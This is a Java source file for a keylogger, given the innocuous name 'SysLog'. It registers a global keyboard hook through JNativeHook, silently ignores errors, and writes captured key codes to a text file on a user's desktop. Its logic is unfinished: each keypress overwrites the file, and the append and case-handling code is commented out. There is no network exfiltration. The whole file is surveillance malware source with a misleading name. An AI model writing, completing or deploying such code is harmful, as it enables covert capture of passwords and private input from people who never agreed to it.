package syslog;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class SysLog implements NativeKeyListener {

    private final Path url = Paths.get("C:/Users/dougl/Desktop/keys.txt");
    private int shift = 1; //42
    private int caps = 1; //58
    private final int Right_left = 3658;
    private final int exclamacao = 122;

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT){
            this.shift = NativeKeyEvent.VC_SHIFT;
        }
        
        try {
            
        switch (e.getKeyCode()){ //3638
            case 3638:
                
                break;
        }        
        
            byte[] txtByte = Files.readAllBytes(url);
            String lerTexto = new String(txtByte) + " ";
            String writeKeysPress = String.valueOf(e.getKeyCode()); //lerTexto + testLowerCase(e);
            byte[] writeKeysByte = writeKeysPress.getBytes();
            Files.write(url, writeKeysByte);
            
            if (e.getKeyCode() == NativeKeyEvent.VC_INSERT) {
                System.exit(0);
            }
        } catch (IOException ex) {
            
        }
    }
    
    public String testLowerCase(NativeKeyEvent b){
        String m = NativeKeyEvent.getKeyText(b.getKeyCode());
        if (this.shift == 1 && this.caps == 1) {
            m = m.toLowerCase();
        }
        return m;
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == 42) {
            this.shift = 1;
        }
        /*try {
        byte[] txtByte = Files.readAllBytes(url);
        String lerTexto = new String(txtByte);
        String writeKeysReleased = lerTexto + "\nSoltada: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n";
        byte[] writeKeysByte = writeKeysReleased.getBytes();
        Files.write(url, writeKeysByte);
        } catch (IOException ex) {
        
        }*/
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        /*try {
        byte[] txtByte = Files.readAllBytes(url);
        String lerTexto = new String(txtByte);
        String writeKeysTyped = lerTexto + "\nClicada: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n";
        byte[] writeKeysByte = writeKeysTyped.getBytes();
        Files.write(url, writeKeysByte);
        } catch (IOException ex) {
        
        }*/
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new SysLog());
    }
}
